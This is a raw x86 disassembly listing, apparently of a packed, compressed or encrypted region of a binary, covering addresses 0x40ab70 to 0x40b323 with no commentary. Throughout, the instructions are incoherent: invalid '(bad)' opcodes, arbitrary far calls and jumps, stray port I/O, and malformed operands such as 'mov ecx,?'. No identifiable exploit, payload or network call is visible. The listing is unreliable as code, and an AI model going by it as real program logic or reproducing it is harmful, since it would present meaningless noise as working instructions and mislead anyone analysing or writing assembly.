  40ab70:	cmp    ch,BYTE PTR [ebx+0xb0250f3]
  40ab76:	add    BYTE PTR [eax-0x22],ch
  40ab79:	fadd   QWORD PTR [edx-0x6]
  40ab7c:	mov    gs,ebx
  40ab7e:	mov    dh,0x2
  40ab80:	lods   eax,DWORD PTR ds:[esi]
  40ab81:	cmc    
  40ab82:	xchg   ebx,eax
  40ab83:	mov    esp,0x534b8b8b
  40ab88:	data16 (bad) 
  40ab8a:	shl    DWORD PTR [esi-0x40999b41],cl
  40ab90:	xor    ch,cl
  40ab92:	xlat   BYTE PTR ds:[ebx]
  40ab93:	inc    ebx
  40ab94:	pop    es
  40ab95:	std    
  40ab96:	call   0xd4cb:0xf2fb51b0
  40ab9d:	xor    ah,dh
  40ab9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aba0:	(bad)
  40aba3:	lods   al,BYTE PTR ds:[esi]
  40aba4:	xor    DWORD PTR [eax+0x79b24054],ebx
  40abaa:	mov    esp,0x72fd1ac6
  40abaf:	ins    BYTE PTR es:[edi],dx
  40abb0:	popf   
  40abb1:	adc    al,0x90
  40abb3:	out    dx,eax
  40abb4:	jle    0x40abc1
  40abb6:	pop    ss
  40abb7:	sub    DWORD PTR [ebx-0x4d30d308],edx
  40abbd:	jne    0x40abfd
  40abbf:	sub    BYTE PTR [ecx-0x5ca42a1e],ah
  40abc5:	stc    
  40abc6:	cld    
  40abc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abc8:	xchg   edx,eax
  40abca:	push   0xf05e49f8
  40abcf:	sbb    al,0xb2
  40abd1:	stos   BYTE PTR es:[edi],al
  40abd2:	mov    bh,0x50
  40abd4:	in     al,0x7d
  40abd6:	cmp    ebx,eax
  40abd8:	inc    ebx
  40abd9:	or     ebp,esp
  40abdb:	pop    edi
  40abdc:	jl     0x40abb0
  40abde:	aad    0x9a
  40abe0:	shl    BYTE PTR [edx-0x5f],cl
  40abe3:	div    BYTE PTR [edx+0x3484994e]
  40abe9:	jns    0x40abb7
  40abeb:	add    eax,DWORD PTR [edi+0x10657eee]
  40abf1:	or     esp,eax
  40abf3:	and    edx,DWORD PTR [eax-0x36]
  40abf6:	gs ds mov al,0x8d
  40abfa:	lahf   
  40abfb:	sbb    al,0x54
  40abfd:	daa    
  40abfe:	mov    esi,0x9b8f722c
  40ac03:	xchg   ebp,eax
  40ac04:	pusha  
  40ac05:	add    cl,BYTE PTR [ecx]
  40ac07:	test   cl,ch
  40ac09:	popf   
  40ac0a:	dec    esi
  40ac0b:	inc    ebp
  40ac0c:	mov    dl,0x29
  40ac0e:	bnd data16 jl 0x40ac3d
  40ac12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac13:	mov    eax,0x605906ce
  40ac18:	in     al,0x9c
  40ac1a:	mov    bl,0xa7
  40ac1c:	das    
  40ac1d:	es dec esi
  40ac1f:	loopne 0x40abd3
  40ac21:	call   0x53fa:0xb3642642
  40ac28:	out    dx,al
  40ac29:	or     bh,cl
  40ac2b:	cmp    edi,DWORD PTR [edx+0x3d4b0a91]
  40ac31:	jnp    0x40ac91
  40ac33:	repz mov dl,0xd4
  40ac36:	mov    esp,0x99296036
  40ac3b:	dec    ecx
  40ac3c:	enter  0xe908,0x5c
  40ac40:	xchg   edx,eax
  40ac41:	call   0x7a8ab88a
  40ac46:	sbb    BYTE PTR [edx-0x7b630d4e],0x6f
  40ac4d:	add    BYTE PTR [ebp+0x6d0ca265],dh
  40ac53:	fldcw  WORD PTR ds:0xba97fe92
  40ac59:	xor    BYTE PTR [edx],0x68
  40ac5c:	(bad)  
  40ac5d:	xlat   BYTE PTR ds:[ebx]
  40ac5e:	ret    
  40ac5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac60:	lds    esi,FWORD PTR [eax+0x5038df2f]
  40ac66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac67:	test   eax,0xc2a0702b
  40ac6c:	adc    bh,bl
  40ac6e:	cmp    al,0xde
  40ac70:	inc    eax
  40ac71:	adc    DWORD PTR [esi-0x255d0116],eax
  40ac77:	jl     0x40ac20
  40ac79:	mov    ecx,?
  40ac7b:	fisub  DWORD PTR [ebx]
  40ac7d:	add    BYTE PTR [edi+0x4d],dl
  40ac80:	je     0x40ac6d
  40ac82:	inc    edx
  40ac83:	repz mov bl,0x1f
  40ac86:	xor    al,0x5f
  40ac88:	dec    ebx
  40ac89:	leave  
  40ac8a:	or     BYTE PTR [edx-0x58f190be],ah
  40ac90:	ret    0x3c33
  40ac93:	or     DWORD PTR [edi+0x51],0x3d
  40ac97:	test   BYTE PTR [ebp-0x5bede894],dh
  40ac9d:	push   edi
  40ac9e:	mov    edx,0x78e43c8d
  40aca3:	test   al,0x6a
  40aca5:	cmp    al,0xf6
  40aca7:	stos   BYTE PTR es:[edi],al
  40aca8:	push   edx
  40aca9:	sub    eax,0x5dd499ce
  40acae:	call   0x574f:0x58c24a0b
  40acb5:	in     eax,dx
  40acb6:	or     al,0xba
  40acb8:	arpl   WORD PTR [edx],bx
  40acba:	test   eax,0x2d8c04a7
  40acbf:	icebp  
  40acc0:	sub    DWORD PTR [edx],0xffffff94
  40acc3:	sbb    DWORD PTR [edi],esp
  40acc5:	std    
  40acc6:	sahf   
  40acc7:	inc    ebp
  40acc8:	adc    ebx,DWORD PTR [ebx+ebx*4+0xc61ca67]
  40accf:	xchg   edi,eax
  40acd0:	dec    edi
  40acd1:	sub    BYTE PTR [bp+0x1382],al
  40acd6:	cdq    
  40acd7:	(bad)  
  40acd8:	sbb    eax,0x11f460ee
  40acdd:	jecxz  0x40ac86
  40acdf:	xchg   DWORD PTR [eax],ebp
  40ace1:	std    
  40ace2:	js     0x40ac8c
  40ace4:	jle    0x40ac92
  40ace6:	fst    QWORD PTR [edx+edx*4]
  40ace9:	in     eax,dx
  40acea:	jmp    0x40acc8
  40acec:	arpl   ax,si
  40acee:	call   0x47c2:0xa3a46955
  40acf5:	inc    ecx
  40acf6:	nop
  40acf7:	test   eax,0x9dcea3f
  40acfc:	rol    BYTE PTR [eax-0x1c],cl
  40acff:	mov    al,ds:0x8a9acba4
  40ad04:	jo     0x40ad05
  40ad06:	cli    
  40ad07:	or     cl,dl
  40ad09:	jo     0x40ad57
  40ad0b:	mov    eax,0x9c60bc37
  40ad10:	mov    dl,0xa1
  40ad12:	mov    edx,0xda52b539
  40ad17:	cmp    eax,0x19b56fbc
  40ad1c:	nop
  40ad1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad1e:	jnp    0x40ad27
  40ad20:	dec    ebp
  40ad22:	or     ah,ah
  40ad24:	inc    edx
  40ad25:	or     esp,DWORD PTR [esp+eax*1-0x7]
  40ad29:	fnstcw WORD PTR [ecx-0x5d]
  40ad2c:	jecxz  0x40acf4
  40ad2e:	call   0x7b30:0x4954ecf0
  40ad35:	imul   edx,edx,0xffffffa7
  40ad38:	push   cs
  40ad39:	enter  0x9396,0x88
  40ad3d:	pop    ebx
  40ad3e:	mov    cl,0x99
  40ad40:	mov    esp,0x266b0579
  40ad45:	mov    es,WORD PTR fs:[esi+esi*2]
  40ad49:	aad    0xc6
  40ad4b:	dec    edi
  40ad4c:	push   es
  40ad4d:	xor    DWORD PTR [ebx],0xffffffa6
  40ad50:	ret    
  40ad51:	inc    ebp
  40ad52:	or     al,0x5b
  40ad54:	mov    WORD PTR [ecx],es
  40ad56:	sub    BYTE PTR [ebx+0x42],dh
  40ad59:	neg    BYTE PTR [edx+0x7328407a]
  40ad5f:	ss and cl,bh
  40ad62:	ins    BYTE PTR es:[edi],dx
  40ad63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad64:	jmp    0x97d7:0xfcfabafe
  40ad6b:	xor    esi,DWORD PTR [ebp+0x24db42ac]
  40ad71:	push   ecx
  40ad72:	dec    edx
  40ad73:	add    eax,0xa9b24c5f
  40ad78:	fdiv   QWORD PTR [edi]
  40ad7a:	(bad)  
  40ad7b:	sbb    bl,BYTE PTR [esi+ebp*4]
  40ad7e:	pop    edx
  40ad7f:	lods   al,BYTE PTR cs:[esi]
  40ad81:	push   ebp
  40ad82:	dec    esi
  40ad83:	mov    eax,ds:0xf7160fb8
  40ad88:	out    dx,al
  40ad89:	fwait
  40ad8a:	call   0x985b:0x86f4c6f8
  40ad91:	or     eax,DWORD PTR [ebp-0x5450d182]
  40ad97:	in     eax,0x1
  40ad99:	fistp  DWORD PTR [edx+0x6ebb0bcf]
  40ad9f:	repnz xchg edx,eax
  40ada1:	fst    QWORD PTR [edi+0x51]
  40ada4:	xchg   DWORD PTR [ebx],ecx
  40ada6:	cmp    ebx,DWORD PTR [edx]
  40ada8:	cwde   
  40ada9:	mov    edx,0x5c0d8b29
  40adae:	call   0xaa3:0xc8ce67ab
  40adb5:	repz sbb ah,0xfa
  40adb9:	jnp    0x40ad68
  40adbb:	mov    ebx,0xdd948381
  40adc0:	mov    dh,0x89
  40adc2:	ins    DWORD PTR es:[edi],dx
  40adc3:	mov    bh,0xae
  40adc5:	retf   
  40adc6:	pop    ecx
  40adc7:	push   0x7d
  40adc9:	loope  0x40ad65
  40adcb:	mov    ebp,0x82ed93f0
  40add0:	clc    
  40add1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add2:	mov    WORD PTR [edi-0x3e7bfdd],fs
  40add8:	ficom  WORD PTR [ecx-0x56]
  40addb:	mov    esi,DWORD PTR [edi+0x63616b15]
  40ade1:	shl    DWORD PTR [edi+eiz*1+0x6c],cl
  40ade5:	(bad)  
  40ade6:	stos   DWORD PTR es:[edi],eax
  40ade7:	pusha  
  40ade8:	mov    ecx,0x28cbbc8f
  40aded:	or     ebp,DWORD PTR [ecx+0x59]
  40adf0:	outs   dx,DWORD PTR ds:[esi]
  40adf1:	loope  0x40ad90
  40adf3:	out    dx,eax
  40adf4:	pop    ds
  40adf5:	fadd   DWORD PTR [esi+edi*4+0x4ebe0bc9]
  40adfc:	call   0xb31b8b9e
  40ae01:	pop    edi
  40ae02:	cmp    esi,DWORD PTR [ebp+0x627fecce]
  40ae08:	clc    
  40ae09:	or     edx,DWORD PTR [edi]
  40ae0b:	adc    eax,0xf9f009c2
  40ae10:	sub    bh,ch
  40ae12:	call   0x41b8:0xe06ebc60
  40ae19:	das    
  40ae1a:	in     al,0xa7
  40ae1c:	xchg   ebx,edi
  40ae1e:	xor    DWORD PTR [ebx+0x1183a617],ebx
  40ae24:	mov    ch,0x1e
  40ae26:	adc    dh,bl
  40ae28:	repnz test al,0x9a
  40ae2b:	or     eax,0xb8c38a61
  40ae30:	ds xor eax,0xef5d2760
  40ae36:	xchg   edx,eax
  40ae37:	or     al,0xce
  40ae39:	aas    
  40ae3a:	pop    edx
  40ae3b:	pop    ecx
  40ae3c:	out    dx,al
  40ae3d:	(bad)  
  40ae3e:	bound  ebx,QWORD PTR [ebp-0xa4df801]
  40ae44:	xchg   esi,eax
  40ae45:	and    ah,al
  40ae47:	shl    DWORD PTR [edx-0x2ac26e4b],1
  40ae4d:	std    
  40ae4e:	lock add al,0x7f
  40ae51:	or     ebx,edi
  40ae53:	fmul   st(4),st
  40ae55:	or     BYTE PTR [ecx],dl
  40ae57:	cld    
  40ae58:	mov    esi,0x6a019a1e
  40ae5d:	cmp    eax,0x3ef1df0e
  40ae62:	aad    0xa7
  40ae64:	mov    dh,0x92
  40ae66:	mov    ds:0x5324f3b1,eax
  40ae6b:	push   0x39a5ec1
  40ae70:	popa   
  40ae71:	push   0x2e1f47a8
  40ae76:	mov    eax,0x9a4fe19c
  40ae7b:	mov    cl,BYTE PTR [ecx+0x55]
  40ae7e:	cmp    al,0x5
  40ae80:	pusha  
  40ae81:	xchg   edx,eax
  40ae82:	call   0xda21:0xc1878143
  40ae89:	jbe    0x40aef9
  40ae8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae8c:	cmp    BYTE PTR [esi],bl
  40ae8e:	add    BYTE PTR [edi-0x62],cl
  40ae91:	adc    bh,ch
  40ae93:	dec    esi
  40ae94:	mov    cl,0xc5
  40ae96:	ret    0x82ec
  40ae99:	push   esi
  40ae9a:	cs push edi
  40ae9c:	je     0x40aefb
  40ae9e:	test   eax,0xfd9eeda7
  40aea3:	es jnp 0x40aefb
  40aea6:	add    al,0x14
  40aea8:	mov    dl,0x89
  40aeaa:	push   es
  40aeab:	das    
  40aeac:	adc    al,0xa8
  40aeae:	mov    bh,0x34
  40aeb0:	jno    0x40aebd
  40aeb2:	aad    0x1e
  40aeb4:	cmc    
  40aeb5:	and    al,0x91
  40aeb7:	daa    
  40aeb8:	call   0xeab3:0xd67399a2
  40aebf:	stos   DWORD PTR es:[edi],eax
  40aec0:	add    ah,BYTE PTR [ebx-0x8e5b8c0]
  40aec6:	push   es
  40aec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aec8:	fadd   QWORD PTR [edx*8+0x31aeb1be]
  40aecf:	jmp    0x2d76:0xb1fddbb5
  40aed6:	mov    ah,BYTE PTR [eax-0x4189634]
  40aedc:	cli    
  40aedd:	add    ebx,DWORD PTR [edx+0x6747ed6f]
  40aee3:	pushf  
  40aee4:	sub    eax,0x84cc9af5
  40aee9:	jns    0x40aecb
  40aeeb:	push   ebx
  40aeec:	dec    eax
  40aeed:	mov    ah,0xc7
  40aeef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef0:	cmp    eax,0xd35009e4
  40aef5:	mov    ?,WORD PTR [eax-0x14d7a]
  40aefb:	mov    bh,0x7
  40aefd:	setg   BYTE PTR [eax-0xb]
  40af01:	or     eax,eax
  40af03:	icebp  
  40af04:	aas    
  40af05:	mov    ecx,ecx
  40af07:	mov    al,ds:0xab9a4eb8
  40af0c:	shr    DWORD PTR [eax],1
  40af0e:	and    edi,DWORD PTR [ebx-0x63]
  40af11:	int3   
  40af12:	and    al,0xa5
  40af14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af15:	or     cl,BYTE PTR [eax+0x78]
  40af18:	push   cs
  40af19:	cmp    DWORD PTR [edx],ebx
  40af1b:	sbb    al,0xae
  40af1d:	dec    edx
  40af1e:	xchg   edi,eax
  40af1f:	test   eax,0x27ec2988
  40af24:	rol    BYTE PTR [ebx-0x5ee0f783],cl
  40af2a:	jle    0x40aecd
  40af2c:	ss sub al,0xa2
  40af2f:	mov    ch,0x81
  40af31:	jne    0x40aecd
  40af33:	in     al,dx
  40af34:	lahf   
  40af35:	call   0xa4ea:0x4fcf6233
  40af3c:	push   cs
  40af3d:	sub    BYTE PTR [ebp+0x228d945f],0xc4
  40af44:	sub    DWORD PTR [edx],edi
  40af46:	cdq    
  40af47:	fisttp WORD PTR [ebp+edx*1-0x18]
  40af4b:	or     BYTE PTR [esi],bh
  40af4d:	mov    ebx,0xbf13439
  40af52:	icebp  
  40af53:	mov    al,0xf9
  40af55:	pop    edi
  40af56:	or     BYTE PTR [esi+0x6d93ace1],dh
  40af5c:	test   eax,0xab270ed2
  40af61:	test   BYTE PTR [edx],dl
  40af63:	and    DWORD PTR [esi-0x59e3aaf4],eax
  40af69:	gs dec ebx
  40af6b:	pop    es
  40af6c:	ins    BYTE PTR es:[edi],dx
  40af6d:	mov    ds:0xdeb27f35,al
  40af72:	jno    0x40af37
  40af74:	ss sbb al,0x66
  40af77:	aad    0x7b
  40af79:	or     DWORD PTR [esi+0x601e7296],edi
  40af7f:	cmp    edx,edx
  40af81:	mov    al,ds:0x81b2aa48
  40af86:	pop    esi
  40af87:	and    al,0x68
  40af89:	test   BYTE PTR [edi],al
  40af8b:	out    0xcb,al
  40af8d:	or     edi,DWORD PTR [eax]
  40af8f:	fdivr  DWORD PTR [edx]
  40af91:	call   0xc09a:0xf0bbfb2a
  40af98:	push   edx
  40af99:	stos   DWORD PTR es:[edi],eax
  40af9a:	ss stos DWORD PTR es:[edi],eax
  40af9c:	push   es
  40af9d:	jmp    0x82e1:0xa49ca924
  40afa4:	xchg   edx,eax
  40afa5:	cmp    ebx,esp
  40afa7:	imul   esi,DWORD PTR [edx+ebx*8],0x85a1209a
  40afae:	xlat   BYTE PTR ds:[ebx]
  40afaf:	clc    
  40afb0:	dec    esi
  40afb1:	mov    bl,0x5d
  40afb3:	cdq    
  40afb4:	test   eax,0x27eb9bac
  40afb9:	mov    ebx,0xcff69cad
  40afbe:	mov    ds:0x8446b330,eax
  40afc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afc4:	mov    ecx,0x32b6b5b1
  40afc9:	lea    eax,[ecx+0x2c]
  40afcc:	aam    0x38
  40afce:	xchg   DWORD PTR [ebp-0x1787da4e],ecx
  40afd4:	out    0xc1,al
  40afd6:	dec    ebx
  40afd7:	mov    ebx,0xc6130ce8
  40afdc:	ss cld 
  40afde:	pop    ss
  40afdf:	pop    es
  40afe0:	xchg   edx,eax
  40afe1:	fstp   DWORD PTR [esi+eiz*1]
  40afe4:	mov    dl,0x5e
  40afe6:	jne    0x40af6d
  40afe8:	ins    BYTE PTR es:[edi],dx
  40afe9:	sar    BYTE PTR [esi],1
  40afeb:	inc    edi
  40afec:	popf   
  40afed:	or     eax,DWORD PTR [ebp-0x2937ae02]
  40aff3:	popf   
  40aff4:	inc    esp
  40aff5:	lds    ebx,FWORD PTR [edx+0x5aea1915]
  40affb:	inc    ecx
  40affc:	xchg   DWORD PTR [edi-0x10],ebp
  40afff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b000:	xor    DWORD PTR [edx+0x65c0c6d0],esp
  40b006:	nop
  40b007:	repnz push esp
  40b009:	xchg   ecx,eax
  40b00a:	cdq    
  40b00b:	sub    WORD PTR [eax+0x1b],di
  40b00f:	sbb    al,0xbf
  40b011:	(bad)  [esi]
  40b013:	test   BYTE PTR [edx],dh
  40b015:	or     esp,eax
  40b017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b018:	inc    esp
  40b019:	(bad)  
  40b01a:	pop    ebp
  40b01b:	mov    edx,0x4898c70a
  40b020:	into   
  40b021:	test   eax,0xebf76574
  40b026:	xor    BYTE PTR [ecx+edi*2+0xb],cl
  40b02a:	inc    edi
  40b02b:	ret    
  40b02c:	jmp    FWORD PTR [edx-0xd3a4cfa]
  40b032:	call   0x9ef1:0xc8756126
  40b039:	test   DWORD PTR [edx],eax
  40b03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b03c:	fldcw  WORD PTR [ebp-0xbcbf35e]
  40b042:	push   cs
  40b043:	cld    
  40b044:	shr    edx,0x9a
  40b047:	jecxz  0x40b047
  40b049:	sub    al,0xdf
  40b04b:	imul   ecx,DWORD PTR [edi-0x352c5015],0x546e740b
  40b055:	and    eax,0x6e4b6b34
  40b05a:	out    dx,al
  40b05b:	mov    WORD PTR [esi-0x4d973777],ss
  40b061:	aaa    
  40b062:	cwde   
  40b063:	xor    eax,0xa71af627
  40b068:	mov    eax,0xea874719
  40b06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b06e:	aam    0x8e
  40b070:	mov    dl,0x2f
  40b072:	push   0x8fc3e0e0
  40b077:	and    al,0x14
  40b079:	or     eax,DWORD PTR [ecx]
  40b07b:	inc    edx
  40b07c:	push   ds
  40b07d:	jmp    0x550dd02b
  40b082:	xchg   ebp,eax
  40b083:	out    dx,eax
  40b084:	jl     0x40b0b7
  40b086:	inc    eax
  40b087:	daa    
  40b088:	jo     0x40b091
  40b08a:	aam    0xc8
  40b08c:	sahf   
  40b08d:	or     edi,DWORD PTR [ebx-0x12]
  40b090:	lods   al,BYTE PTR ds:[esi]
  40b091:	mov    edx,0x73c31cf3
  40b096:	call   0xb5b1:0xe4291c15
  40b09d:	fnstsw WORD PTR [esi-0x47]
  40b0a0:	cmc    
  40b0a1:	stos   BYTE PTR es:[edi],al
  40b0a2:	cmp    BYTE PTR ds:0x6fb0b057,ah
  40b0a8:	jb     0x40b0b7
  40b0aa:	iret   
  40b0ab:	mov    DWORD PTR [edx+ebx*4-0x66],0x12705dbb
  40b0b3:	ror    DWORD PTR [esi+0x50a77dcf],1
  40b0b9:	mov    edi,0xaf0e5fbd
  40b0be:	xchg   edx,eax
  40b0bf:	push   es
  40b0c0:	mov    cl,0x73
  40b0c2:	add    ebp,DWORD PTR [edi-0x3e]
  40b0c5:	cs push ebx
  40b0c7:	pop    ds
  40b0c8:	daa    
  40b0c9:	fild   WORD PTR [ebp-0x62]
  40b0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0cd:	jno    0x40b0e9
  40b0cf:	rcl    DWORD PTR [ecx+0x107cc765],cl
  40b0d5:	das    
  40b0d6:	call   0xeb40:0x6bc5b859
  40b0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0de:	dec    edi
  40b0df:	call   0x3c07:0x349a06df
  40b0e6:	xor    bh,BYTE PTR [ebx+0x7b]
  40b0e9:	aam    0x9a
  40b0eb:	sub    eax,esi
  40b0ed:	dec    edx
  40b0ee:	jge    0x40b12a
  40b0f0:	mov    ah,0x23
  40b0f2:	clc    
  40b0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0f4:	sahf   
  40b0f5:	je     0x40b0c5
  40b0f7:	jmp    0x10bc:0x481efbb6
  40b0fe:	inc    eax
  40b0ff:	jbe    0x40b091
  40b101:	imul   ebx,DWORD PTR [ebp+0x674e00b6],0xffffffa7
  40b108:	mov    al,BYTE PTR [edx+0x18]
  40b10b:	dec    edx
  40b10c:	ret    0xdaa7
  40b10f:	aaa    
  40b110:	mov    dl,0xaf
  40b112:	dec    ebp
  40b113:	cs in  eax,0xa3
  40b116:	sub    ebp,0xffffffb9
  40b119:	jl     0x40b11d
  40b11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b11c:	jmp    0xffdb:0x31ee6a6f
  40b123:	dec    ebx
  40b124:	or     BYTE PTR [ebx-0x66],al
  40b127:	cmp    al,0x4
  40b129:	xchg   esp,eax
  40b12a:	in     al,0x29
  40b12c:	push   ds
  40b12d:	push   ss
  40b12e:	sbb    al,0xa7
  40b130:	repz inc esp
  40b132:	mov    bh,0xc7
  40b134:	(bad)  
  40b136:	mov    esp,0x65b7b24a
  40b13b:	jno    0x40b148
  40b13d:	jmp    0xee:0xb55143c
  40b144:	pop    ds
  40b145:	fadd   st,st(5)
  40b147:	xchg   esi,eax
  40b148:	imul   edx,DWORD PTR [edx],0x7c370e99
  40b14e:	cwde   
  40b14f:	(bad)  
  40b150:	loope  0x40b0d5
  40b152:	scas   al,BYTE PTR es:[edi]
  40b153:	aam    0xf8
  40b155:	or     cl,BYTE PTR [esp-0x78d5ee32]
  40b15c:	mov    dl,bh
  40b15e:	(bad)  
  40b15f:	shl    BYTE PTR [edx+0x676e8562],1
  40b165:	xlat   BYTE PTR ds:[ebx]
  40b166:	popf   
  40b167:	dec    eax
  40b168:	adc    DWORD PTR ds:0xcbf04e33,0xffffff8e
  40b16f:	push   esp
  40b170:	int3   
  40b171:	push   edx
  40b172:	sub    eax,0x9851b2b8
  40b177:	xchg   DWORD PTR [edi-0x4674ae21],esp
  40b17d:	or     ecx,DWORD PTR [edi+eax*2+0x2e5871e3]
  40b184:	cmc    
  40b185:	sub    al,0x9d
  40b187:	xor    BYTE PTR [ebp*8+0x82296e5],dl
  40b18e:	cmc    
  40b18f:	sbb    BYTE PTR [edi+0xb],bl
  40b192:	aad    0xf6
  40b194:	xchg   edx,eax
  40b195:	push   eax
  40b196:	xor    BYTE PTR [ecx+0x209a17eb],ch
  40b19c:	push   es
  40b19d:	(bad)  [esi+0x6eae569f]
  40b1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a4:	fild   DWORD PTR [ebx-0xf]
  40b1a7:	sbb    al,0xba
  40b1a9:	sub    eax,0xf73a7395
  40b1ae:	call   0x6a42:0x51fad576
  40b1b5:	div    BYTE PTR [ecx+0x61af4a52]
  40b1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1bc:	mov    bh,0x0
  40b1be:	jecxz  0x40b1a1
  40b1c0:	jne    0x40b1db
  40b1c2:	xchg   edx,eax
  40b1c3:	int3   
  40b1c4:	mov    dl,0x16
  40b1c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1c7:	push   es
  40b1c8:	data16 fwait
  40b1ca:	adc    DWORD PTR [ebx-0x79],ecx
  40b1cd:	or     ebp,edx
  40b1cf:	mul    cl
  40b1d1:	imul   eax,DWORD PTR [eax+eax*8+0x11],0x50809ae6
  40b1d9:	cmp    al,0x26
  40b1db:	xchg   esp,eax
  40b1dc:	jbe    0x40b226
  40b1de:	dec    ebx
  40b1df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1e0:	cdq    
  40b1e1:	inc    eax
  40b1e2:	mov    ds:0xc47dd151,al
  40b1e7:	push   ebp
  40b1e8:	mov    dl,0x51
  40b1ea:	push   edx
  40b1eb:	cmp    DWORD PTR [edi-0x16fd5653],ebp
  40b1f1:	or     edx,DWORD PTR [edi+0x20]
  40b1f4:	mov    dh,BYTE PTR [ebx-0x6a]
  40b1f7:	xchg   esi,eax
  40b1f8:	popa   
  40b1f9:	mov    ah,0x94
  40b1fb:	test   eax,0x9807a8a5
  40b201:	gs ins DWORD PTR es:[edi],dx
  40b203:	in     eax,dx
  40b204:	lahf   
  40b205:	or     eax,DWORD PTR [edx-0x1928937a]
  40b20b:	lock xchg esi,eax
  40b20d:	test   eax,0x47cc3f2a
  40b212:	jl     0x40b22c
  40b214:	mov    dl,0x9f
  40b216:	daa    
  40b217:	xlat   BYTE PTR ds:[ebx]
  40b218:	rcl    BYTE PTR [ebx+0xb664a36],1
  40b21e:	dec    ebp
  40b21f:	jb     0x40b268
  40b221:	pop    ds
  40b222:	(bad)  
  40b223:	pop    ebx
  40b224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b225:	and    DWORD PTR [ebp-0x50ff5fb8],ebx
  40b22b:	loop   0x40b20f
  40b22d:	(bad)  
  40b22e:	fld    DWORD PTR [ecx-0x3a]
  40b231:	stc    
  40b232:	xchg   BYTE PTR [edi+0x1fa41a77],ah
  40b238:	and    bl,BYTE PTR [edx+eiz*8]
  40b23b:	sahf   
  40b23c:	lea    ebp,[edx-0x31]
  40b23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b240:	sahf   
  40b241:	jp     0x40b1c6
  40b243:	push   ds
  40b244:	cmp    eax,0xaf77297
  40b249:	or     eax,DWORD PTR [ebx+0x43]
  40b24c:	cmp    DWORD PTR [ebx-0xd262c94],edi
  40b252:	cdq    
  40b253:	jnp    0x40b2d3
  40b255:	inc    eax
  40b256:	add    DWORD PTR [edx+0x48c7cbb8],0x12f93b50
  40b260:	sbb    bh,ch
  40b262:	pushf  
  40b263:	dec    DWORD PTR [esi-0x22d808d7]
  40b269:	adc    DWORD PTR [esi],0x42aeb04d
  40b26f:	mov    ebx,0x6743f096
  40b274:	and    al,0x4d
  40b276:	in     al,dx
  40b277:	xchg   edi,eax
  40b278:	sbb    bl,ch
  40b27a:	call   0xe2f1:0x5991f38d
  40b281:	js     0x40b2e8
  40b283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b284:	scas   eax,DWORD PTR es:[edi]
  40b285:	mov    eax,ds:0xc09c2576
  40b28a:	jp     0x40b2a0
  40b28c:	mov    dl,0x82
  40b28e:	stc    
  40b28f:	imul   DWORD PTR ds:[ebp+0x2b]
  40b293:	retf   0xbb0
  40b296:	arpl   di,cx
  40b298:	and    BYTE PTR [edx],0xe5
  40b29b:	inc    esi
  40b29c:	sub    eax,0xb5e3026f
  40b2a1:	jecxz  0x40b285
  40b2a3:	jmp    0x40b26a
  40b2a5:	push   esi
  40b2a6:	jp     0x40b279
  40b2a8:	sub    dh,BYTE PTR [ebp-0x53]
  40b2ab:	mov    DWORD PTR [esi+0x27],0x256b2cf8
  40b2b2:	call   0xaa4a:0x3de7ce47
  40b2b9:	jp     0x40b2da
  40b2bb:	push   ebx
  40b2bc:	in     eax,dx
  40b2bd:	in     al,0xfa
  40b2bf:	xchg   edi,eax
  40b2c1:	add    eax,0xd9268642
  40b2c6:	pop    edx
  40b2c7:	push   ebx
  40b2c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2c9:	stos   DWORD PTR es:[edi],eax
  40b2ca:	push   cx
  40b2cc:	mov    dl,0xa7
  40b2ce:	xor    ah,bl
  40b2d0:	or     ecx,DWORD PTR [ebp+0x47d9f295]
  40b2d6:	mov    ds:0x70e8b2f6,eax
  40b2db:	mov    eax,ds:0x31ad745e
  40b2e0:	mov    dl,0xce
  40b2e2:	mov    eax,0x13ee4aed
  40b2e7:	push   ecx
  40b2e8:	cmp    al,0xb
  40b2ea:	stos   BYTE PTR es:[edi],al
  40b2eb:	inc    esp
  40b2ec:	call   0xbc65fcb0
  40b2f1:	inc    ebx
  40b2f2:	call   0xd49e:0x2f80c878
  40b2f9:	push   ebp
  40b2fa:	or     al,0x83
  40b2fc:	loopne 0x40b364
  40b2fe:	add    DWORD PTR [edi-0x7cc9d88f],esp
  40b304:	pop    esi
  40b305:	adc    al,0x9a
  40b307:	dec    eax
  40b308:	push   es
  40b309:	fistp  WORD PTR [edx+edi*2]
  40b30c:	add    esi,0xf7ffa732
  40b312:	mov    ebp,0x3bd248c5
  40b317:	xor    BYTE PTR [edx-0x47e6be40],dh
  40b31d:	jns    0x40b368
  40b31f:	jo     0x40b32c
  40b321:	or     dh,BYTE PTR [eax]
  40b323:	pop    ds
